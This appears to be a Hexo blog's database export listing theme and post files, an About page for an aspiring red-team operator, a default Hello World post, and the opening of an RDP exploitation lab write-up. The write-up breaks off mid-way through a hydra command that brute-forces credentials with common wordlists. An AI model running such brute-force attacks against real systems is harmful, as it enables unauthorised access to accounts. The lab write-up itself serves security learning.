y/source/css/_global/function.styl","hash":"f19694a42dbe28eda4b39a1696e8fbcd277bc76c","modified":1721159673509},{"_id":"themes/butterfly/source/css/_global/index.styl","hash":"c8ff6ddd5bfe1190b7b8056b68ce41114fd79dcb","modified":1721159673509},{"_id":"themes/butterfly/source/css/_highlight/highlight.styl","hash":"4dcd468e4d11a0ac75406162678feffcd89fee00","modified":1721159673509},{"_id":"themes/butterfly/scripts/tag/button.js","hash":"93229d44b35b9da92e647b89d6d3087085974a29","modified":1721159673505},{"_id":"themes/butterfly/source/css/_highlight/theme.styl","hash":"bcd384c8b2aa0390c9eb69ac1abbfd1240ce1da4","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/aside.styl","hash":"fad650f88778b33a6358e38cf50dfafc0974d28f","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/chat.styl","hash":"f9a5d3f1fc5ed0ed2ee4c1eaa58ed650d11ddebd","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/comments.styl","hash":"134811b2d696f9ed2c0cd578f3886f1c60770c0a","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/footer.styl","hash":"83a7a70eb0532ea9c4267939fe484af915fca01e","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/loading.styl","hash":"ac2aeee9926f75b2a0098efe1c114126987430f2","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/pagination.styl","hash":"fb9f78bfbb79579f1d752cb73fb6d25c8418e0fd","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/head.styl","hash":"18d08be0cd9b1f8c049d4b922e80f8163a55c947","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/relatedposts.styl","hash":"d53de408cb27a2e704aba7f7402b7caebe0410d8","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/post.styl","hash":"a2eb44fa5eaea1325319a2064439cf36d0f35a2f","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/reward.styl","hash":"d6cf26ffb8a0343eda1cde65b6b73b0ddbe8fcfc","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/rightside.styl","hash":"f845b9b4efdee750f70c023aab27432611f83059","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/sidebar.styl","hash":"b7a6a585dbc38d177c9aba75df3a467415d0488a","modified":1721159673509},{"_id":"themes/butterfly/source/css/_layout/third-party.styl","hash":"5556c9bf4f53a90cb9b4945cd76a8849bd67f3f3","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/404.styl","hash":"50dbb9e6d98c71ffe16741b8c1b0c1b9771efd2b","modified":1721159673509},{"_id":"themes/butterfly/source/css/_mode/darkmode.styl","hash":"0db591a1f4ed5adcb8668a549bbee5c9d62682cf","modified":1721159673509},{"_id":"themes/butterfly/source/css/_mode/readmode.styl","hash":"e549d24ad81a7d93326a509ff8dcfcc58c80729e","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/archives.styl","hash":"c9e98027f2dd730ce389c2047f62ebb748955fcf","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/categories.styl","hash":"f01ee74948cedb44e53cd3bb1ef36b7d2778ede7","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/common.styl","hash":"4e320e16d49bc18085045937681f7331a1e243ca","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/flink.styl","hash":"98d755b686ee833e9da10afaa40c4ec2bd66c19a","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/homepage.styl","hash":"d4ebc41b5c855dd75f47de7345d62f85ce7cf073","modified":1721159673509},{"_id":"themes/butterfly/source/css/_page/tags.styl","hash":"580feb7e8b0822a1be48ac380f8c5c53b1523321","modified":1721159673509},{"_id":"themes/butterfly/source/css/_search/index.styl","hash":"20a3134e1302b62bfc881f4ec43f398267111f22","modified":1721159673509},{"_id":"themes/butterfly/source/css/_search/local-search.styl","hash":"961589da3c0a532c4709a4a4ea96bd579257f766","modified":1721159673509},{"_id":"themes/butterfly/source/css/_search/algolia.styl","hash":"649a054e73278b6724bd4dd9b94724791ec5c928","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/gallery.styl","hash":"5cddbb5f4eae695a26685e415d821b523e0f17bf","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/button.styl","hash":"45f0c32bdea117540f6b14ebac6450d7142bd710","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/hexo.styl","hash":"d76c38adf1d9c1279ef4241835667789f5b736e0","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/hide.styl","hash":"ce489ca2e249e2a3cf71584e20d84bdb022e3475","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/inlineImg.styl","hash":"df9d405c33a9a68946b530410f64096bcb72560c","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/label.styl","hash":"66c59e193d794cdb02cca7bd1dc4aea5a19d7e84","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/note.styl","hash":"909bb5079b26b6ee68177919f522566503654058","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/timeline.styl","hash":"f071156d439556e7463ed4bc61ceee87170d5d08","modified":1721159673509},{"_id":"themes/butterfly/source/css/_tags/tabs.styl","hash":"2d02e52b360f6e6cae47c293ae57ed78e2554663","modified":1721159673509},{"_id":"themes/butterfly/source/css/_third-party/normalize.min.css","hash":"2c18a1c9604af475b4749def8f1959df88d8b276","modified":1721159673509},{"_id":"themes/butterfly/source/js/search/algolia.js","hash":"108988d046da9a4716148df43b3975217c8ceaae","modified":1721159673513},{"_id":"themes/butterfly/source/js/search/local-search.js","hash":"e1f60ebac53a3f596fd0a4769b4f9275c48c6542","modified":1721159673513},{"_id":"themes/butterfly/layout/includes/third-party/abcjs/abcjs.pug","hash":"f7299f9fef5bf94bb58c8cd3be8ee660ad2f9cd4","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/abcjs/index.pug","hash":"f58f1648d2d71311bafca4833f20b605bb5f18c8","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/artalk.pug","hash":"71af0b679e00290b0854384368b3c7e9b3e5f26a","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/disqus.pug","hash":"c5f7081ca29db8cc80f808dfc29e36d5fa22fd7e","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/index.pug","hash":"b2d274db84ef22fbd6d5ea8f4404821898934209","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/fb.pug","hash":"0344477a2cf38698318ead2681c63ac12f01586e","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/remark42.pug","hash":"001e8be47854b891efe04013c240c38fed4185eb","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/valine.pug","hash":"39427e107230a10790972349c9dd4c4f31d55eb7","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/twikoo.pug","hash":"56c028ba0ea8fac19f0125114d765dfc56ce2b48","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/waline.pug","hash":"3a5ccfc69bd8ccb4b8f3ce3502023f7914f2a022","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/chat/chatra.pug","hash":"ddce8352b371a1fb426bdb6c33f587eb37a69647","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/chat/crisp.pug","hash":"2fb098a7aa45010a8cd212dc0bd5308c6e7c63e3","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/chat/daovoice.pug","hash":"9b57a8e13de8fc51a5f550854e47164fd8ac1be8","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/chat/messenger.pug","hash":"e39a9c37adf4cb15a2ba3b2cc65542ffea88650d","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/chat/index.pug","hash":"618e1b7f9204049b07beb9e1363c844a78a9ace3","modified":1721159673497},{"_id":"themes/butterfly/layout/includes/third-party/chat/tidio.pug","hash":"dd61eca6e9a45f63e09bdefba89fe285a81ba096","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/artalk.pug","hash":"f77f0fdeac2bc8a72f71a58f9b75aa39f0a108c8","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/disqus.pug","hash":"62f16a602e57e5f7f7c5249dd37b42d436dc032a","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/disqusjs.pug","hash":"3bc4c1b91568561f0491bdac65b75aa0bfd01f27","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/giscus.pug","hash":"2d7b0b09678adba09481e3152e0b32962677f650","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/gitalk.pug","hash":"0d378ee8a671982a46213a4bfb223b4f3409aea9","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/facebook_comments.pug","hash":"46aec6466959baec1c3d71a5dbc510fbeb00c91d","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/index.pug","hash":"a9709905593d960954e2dd572f09f48a6c2b1ef7","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/livere.pug","hash":"63cea2b5c8f7b59f5919379d61a2bb2ce8ed7623","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/js.pug","hash":"00ed91c52939b9675b316137f854d13684c895a6","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/remark42.pug","hash":"f15699abb8c7a255aabad0222ae53eee387c66a3","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/twikoo.pug","hash":"5c29b5887e2e6cd81e1f13b32da53d9c139b788b","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/utterances.pug","hash":"1995a654ba7ad62775a0a6e2922209cd1a85f2e3","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/valine.pug","hash":"46865e3f52096acb07d0212174b4e8751b123aea","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/comments/waline.pug","hash":"7aa443b4881448979b810864e206e58c9ed787e3","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/math/index.pug","hash":"b8ae5fd7d74e1edcef21f5004fc96147e064d219","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/math/katex.pug","hash":"dfcbd9881be569ea420eff1a6b00e4f4dbe2138e","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/math/mermaid.pug","hash":"6b67982bb7a3713b5bffd6a23ba2810425c504d0","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/math/mathjax.pug","hash":"fc072ac839401174b5d3cf9acd3b694246c23a55","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/artalk.pug","hash":"17080aba1754478197ab089f7948ed900f116d2b","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/index.pug","hash":"4ec0642f2d5444acfab570a6f8c7868e7ff43fde","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/github-issues.pug","hash":"0f0b46d637a9a1b6ae35148923abecc80b866276","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/disqus-comment.pug","hash":"2609bc2656aaaa9b59e8d575e711776512a62192","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/remark42.pug","hash":"de2c4d02b520dd49a0a59fc0f33295e5bbb2c624","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/twikoo-comment.pug","hash":"4104f96faa6040f111ebfb9a90eeb470857c3b86","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/valine.pug","hash":"1f9f51023e9e33081c2add2ca73643c0edc5e9d5","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/waline.pug","hash":"24804ab6da9727ed793655c1262fa3f1a9746f70","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/search/algolia.pug","hash":"9c3c109a12d2b6916e8b4965cca12f521510ead9","modified":1721159673501},{"_id":"themes/butterfly/layout/includes/third-party/search/docsearch.pug","hash":"b928be14d1b47a9fadb1bcc5f5072a7328752d4b","modified":1721159673505},{"_id":"themes/butterfly/layout/includes/third-party/search/index.pug","hash":"a99a41334387ee9a46c6f8e8212331a29a10d159","modified":1721159673505},{"_id":"themes/butterfly/layout/includes/third-party/share/addtoany.pug","hash":"85c92f8a7e44d7cd1c86f089a05be438535e5362","modified":1721159673505},{"_id":"themes/butterfly/layout/includes/third-party/search/local-search.pug","hash":"3335024ba91f55ccf3858571b7898f46881c455c","modified":1721159673505},{"_id":"themes/butterfly/layout/includes/third-party/share/index.pug","hash":"3ba49cfe186e9ca05faf9f0d0113611ec47e9b38","modified":1721159673505},{"_id":"themes/butterfly/layout/includes/third-party/share/share-js.pug","hash":"c7dd2b2ae9b23aa0a60fffd7df9e9f76ef52033e","modified":1721159673505},{"_id":"themes/butterfly/source/css/_highlight/highlight/diff.styl","hash":"cf1fae641c927621a4df1be5ca4a853b9b526e23","modified":1721159673509},{"_id":"themes/butterfly/source/css/_highlight/highlight/index.styl","hash":"18804c58239d95798fa86d0597f32d7f7dd30051","modified":1721159673509},{"_id":"themes/butterfly/source/css/_highlight/prismjs/diff.styl","hash":"5972c61f5125068cbe0af279a0c93a54847fdc3b","modified":1721159673509},{"_id":"themes/butterfly/source/css/_highlight/prismjs/index.styl","hash":"5dc2e0bcae9a54bfb9bdcc82d02ae5a3cf1ca97d","modified":1721159673509},{"_id":"themes/butterfly/source/css/_highlight/prismjs/line-number.styl","hash":"25914321762e30aacc610bc4dfb9de3e1cb556a3","modified":1721159673509},{"_id":"themes/butterfly/scripts/helpers/series.js","hash":"821e973d41f7b3b64cde91e0e836ea49c43e3c06","modified":1721159673505},{"_id":"source/images/cyberpunk-red.jpg:Zone.Identifier","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1721160089718},{"_id":"source/images/vl_social.png:Zone.Identifier","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1721160089718},{"_id":"source/images/cyber.jpg","hash":"41c46786822b4b05947fc191c395f21f7c192e15","modified":1721160089714},{"_id":"source/images/vl_social.jpg","hash":"1d73cf7b697aae7ae5e9aeab840889a3e3e32937","modified":1721160089718},{"_id":"source/images/cyberpunk-red.jpg","hash":"8f08f881bc1806d7dd6a649d78b9cd58bbf95c11","modified":1721160089714},{"_id":"source/about/index.md","hash":"fefa84ae2f51dc81dfa094440d83eea2b9fa4bf0","modified":1721160925854},{"_id":"source/tags/index.md","hash":"126418672cbce26f2fda3bcc33eb4956fcdbd24b","modified":1721160964942},{"_id":"source/_posts/Exploiting-services-series/insecure-rdp.md","hash":"ac7783219b69948c2952f87f9e3f55d97e21b5a6","modified":1721161032641},{"_id":"source/_posts/active-directory/acls.md","hash":"45cff3605eb8dfb8f0e1b7debc3223f683114109","modified":1721161032641},{"_id":"source/_posts/active-directory/ad-credential-enumeration.md","hash":"4178279ffcf6de67e50c5a66ac05d23d29e9891b","modified":1721162164847},{"_id":"source/_posts/active-directory/kerberos-101.md","hash":"834d89af876d81e48ec4cb87da4cd8eac383fd77","modified":1721161032637},{"_id":"source/_posts/hacktheboo2023-ctf/forensics.md","hash":"b4c8ca84f08960a680d2a7ee16f4b6219743d645","modified":1721161032645},{"_id":"source/_posts/htb/ferox-https_nagios_monitored_htb_nagiosxi_api_v1_FUZZ-1708722409.state","hash":"fc247b05d3b67326491ba3783b9db56fe456db00","modified":1721161032645},{"_id":"source/_posts/htb/ferox-https_nagios_monitored_htb_nagiosxi_api_v1_FUZZ-1708722456.state","hash":"6e9a45869cdc529b616ace644039ea0b941105cb","modified":1721161032645},{"_id":"source/_posts/htb/manager.md","hash":"1ad08cc935f0188631cecb04937b0a8e0eb9b687","modified":1721161032645},{"_id":"source/_posts/metasploit-ctf/metasploit-1.md","hash":"b2bd2bfd66033bffb3603fbe024062148a509d8d","modified":1721161032649},{"_id":"source/_posts/metasploit-ctf/metasploit-2.md","hash":"a21b545b69a46b29bba3bebbadd8e36b4160bedb","modified":1721161032653},{"_id":"source/_posts/tryhackme/stealth.md","hash":"9d80be9fd863a44802db0381c5c088ca2264c4a7","modified":1721161032653},{"_id":"source/_posts/htb/Hospital/hospital-notes.md","hash":"c0a8f6c15190e4d97cfde9c0542018203a898b9c","modified":1721161032649},{"_id":"source/_posts/htb/PermX/permx.md ","hash":"ee573e5038b4ac99e6c44e2f4419a7c6bbb13635","modified":1721161032649},{"_id":"source/_posts/tryhackme/simple-ctf/easyCTF.md","hash":"10379647e107889356eeb9e5262afc86cae520b0","modified":1721161032653}],"Category":[],"Data":[],"Page":[{"title":"About Me","date":"2024-06-05T18:17:29.000Z","tags":["About"],"categories":"vulnlab","keywords":"About","top_img":"/images/cyberpunk-red.jpg","_content":"\nMy name is Brian Karanja. I am an Aspiring Red Team Operator and recently graduated student from cybershujaa Program at USIU. I have completed a Diploma in Cybersecurity and part of Fr334aks, a large Competitive Cybersecurity Team in Kenya. I am also interested in bikes and traveling.\n\nOffensive security is not just a tool that can be used to describe and discover vulnerabilities in organization's in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.\n\n>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki\n\nCybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.\n\n>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs\n\nLeadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.\n\n>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell\n\nI hope you enjoy the content and research within my website. ","source":"about/index.md","raw":"---\ntitle: About Me\ndate: 2024-06-05 21:17:29\ntags: [About]\ncategories: vulnlab\nkeywords: 'About'\ntop_img: /images/cyberpunk-red.jpg\n---\n\nMy name is Brian Karanja. I am an Aspiring Red Team Operator and recently graduated student from cybershujaa Program at USIU. I have completed a Diploma in Cybersecurity and part of Fr334aks, a large Competitive Cybersecurity Team in Kenya. I am also interested in bikes and traveling.\n\nOffensive security is not just a tool that can be used to describe and discover vulnerabilities in organization's in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.\n\n>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki\n\nCybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.\n\n>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs\n\nLeadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.\n\n>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell\n\nI hope you enjoy the content and research within my website. ","updated":"2024-07-16T20:15:25.854Z","path":"about/index.html","comments":1,"layout":"page","_id":"clyouz1i20000wgjnbo7701fz","content":"<p>My name is Brian Karanja. I am an Aspiring Red Team Operator and recently graduated student from cybershujaa Program at USIU. I have completed a Diploma in Cybersecurity and part of Fr334aks, a large Competitive Cybersecurity Team in Kenya. I am also interested in bikes and traveling.</p>\n<p>Offensive security is not just a tool that can be used to describe and discover vulnerabilities in organization’s in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.</p>\n<blockquote>\n<p>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki</p>\n</blockquote>\n<p>Cybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.</p>\n<blockquote>\n<p>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs</p>\n</blockquote>\n<p>Leadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.</p>\n<blockquote>\n<p>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell</p>\n</blockquote>\n<p>I hope you enjoy the content and research within my website. </p>\n","cover":false,"excerpt":"","more":"<p>My name is Brian Karanja. I am an Aspiring Red Team Operator and recently graduated student from cybershujaa Program at USIU. I have completed a Diploma in Cybersecurity and part of Fr334aks, a large Competitive Cybersecurity Team in Kenya. I am also interested in bikes and traveling.</p>\n<p>Offensive security is not just a tool that can be used to describe and discover vulnerabilities in organization’s in question, it can also be used as a learning experience in ethical hackers and security analysts alike. Data protection, resource retention, and public safety are all factors that contribute to the success of an organization.</p>\n<blockquote>\n<p>“The more I risk being rejected, the better my chances are of being accepted.” - Robert Kiyosaki</p>\n</blockquote>\n<p>Cybersecurity does not have one particular vector of protection. People like myself have understood that there are always routes that an infrastructure is vulnerable to. Unfortunately, a world where data is 100% secure will never be feasible. It is the responsibility of organizations to understand this probability and always be on their heels at any given moment.</p>\n<blockquote>\n<p>“The people who are crazy enough to think they can change the world are the ones who do.” - Steve Jobs</p>\n</blockquote>\n<p>Leadership is a crucial role in understanding not only offensive security in my career field, but a life-role when it comes to understanding problems and issues. This is a common concern in society, as many organizations are able to understand their issues however they are not sure how to action on them. It takes a leader to both understand these problems and to know how to push them into the big picture.</p>\n<blockquote>\n<p>The pessimist complains about the wind. The optimist expects it to change. The leader adjusts the sails.” - John Maxwell</p>\n</blockquote>\n<p>I hope you enjoy the content and research within my website. </p>\n"},{"title":"tags","date":"2024-06-04T14:57:26.000Z","_content":"      ","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-06-04 17:57:26\n---\n      ","updated":"2024-07-16T20:16:04.942Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clyouz1il0002wgjndpgqgtc7","content":"","cover":false,"excerpt":"","more":""}],"Post":[{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2024-07-16T19:49:42.268Z","updated":"2024-07-16T19:49:42.268Z","comments":1,"layout":"post","photos":[],"_id":"clyotw7ep0000sdjn3wtnhuo7","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"INSECURE RDP","date":"2023-10-13T11:21:14.000Z","draft":false,"ShowReadingTime":true,"description":"Exploiting insecure RDP Services","ShowPostNavLinks":true,"top_img":"/images/cyberpunk-red.jpg","ShowToc":true,"_content":"\n**Objective:** \n\nExploit the application and retrieve the flag!\n\n### Enumeration\n\nRunning nmap on our target, we see there's a distinct port `3333` with a very peculiar service `dec-notes`. Our focus primarily will be exploiting the insecure rdp service.\n\n![](https://i.imgur.com/I1s9edD.png)\n\n\n### Metasploit\n\nTo confirm if the target is running rdp we'll use a metasploit module called `rdp-scanner` what it does is it attempts to connect to the specified RDP port and determines if it *\"speaks\"* RDP. \n\nSetting up the required variables for the module, we get an interesting response it's running RDP!!\n\n![](https://i.imgur.com/54Cb8jL.png)\n\n### Bruteforcing credentials\n\nBut for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we'll need to bruteforce some credentials.\n\nWe'll need to use hydra for this bruteforce.\n\n```bash \nhydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 